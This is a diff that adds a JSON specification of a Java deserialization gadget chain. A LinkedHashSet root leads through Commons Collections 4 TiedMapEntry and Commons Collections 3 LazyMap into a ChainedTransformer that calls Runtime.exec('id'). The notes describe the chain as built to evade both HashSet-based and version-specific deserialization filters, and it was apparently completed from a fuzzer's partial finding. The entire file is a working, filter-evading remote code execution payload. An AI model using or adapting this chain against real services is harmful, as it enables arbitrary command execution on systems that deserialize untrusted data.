@@ -1,0 +1,67 @@
+{
+  "chain_type": "CC_CrossLib_LinkedHashSet_Exec - Double evasion: LinkedHashSet + CC4/CC3 (completed from partial finding #2)",
+  "root_class": "java.util.LinkedHashSet",
+  "root_trigger": "readObject->HashMap.put->hash->CC4.TiedMapEntry.hashCode->CC3.LazyMap.get",
+  "links": [
+    {
+      "class": "org.apache.commons.collections4.keyvalue.TiedMapEntry",
+      "field_overrides": {
+        "map": {"$ref": "link:1"},
+        "key": "foo"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.map.LazyMap",
+      "field_overrides": {
+        "map": {},
+        "factory": {"$ref": "link:2"}
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ChainedTransformer",
+      "field_overrides": {
+        "iTransformers": [
+          {"$ref": "link:3"},
+          {"$ref": "link:4"},
+          {"$ref": "link:5"},
+          {"$ref": "link:6"},
+          {"$ref": "link:7"}
+        ]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ConstantTransformer",
+      "field_overrides": { "iConstant": "java.lang.Runtime" }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "getMethod",
+        "iParamTypes": ["java.lang.String", "[Ljava.lang.Class;"],
+        "iArgs": ["getRuntime", []]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "invoke",
+        "iParamTypes": ["java.lang.Object", "[Ljava.lang.Object;"],
+        "iArgs": [null, []]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "exec",
+        "iParamTypes": ["java.lang.String"],
+        "iArgs": ["id"]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ConstantTransformer",
+      "field_overrides": { "iConstant": 1 }
+    }
+  ],
+  "sink_method": "Runtime.exec",
+  "notes": "Double evasion: (1) LinkedHashSet root bypasses HashSet filters, (2) CC4 TiedMapEntry + CC3 LazyMap cross-library evades version-specific filters. Completed from fuzzer partial finding #2."
+}
